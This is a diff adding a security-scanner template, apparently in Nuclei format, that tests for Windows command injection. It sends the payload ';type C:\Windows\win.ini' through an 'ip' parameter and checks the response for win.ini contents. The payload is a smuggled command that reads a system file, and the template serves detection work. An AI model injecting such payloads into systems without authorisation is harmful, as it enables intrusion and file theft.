@@ -1,0 +1,22 @@
+id: patt-cmdi-win-02-ip
+name: 'PATT cmdi patt-cmdi-win-02 via ip'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - patt
+requires:
+  - dotnet
+description: 'PATT Windows file-read via type win.ini. [patt:patt-cmdi-win-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      ip:
+        - ';type C:\Windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
+          - 'fonts'
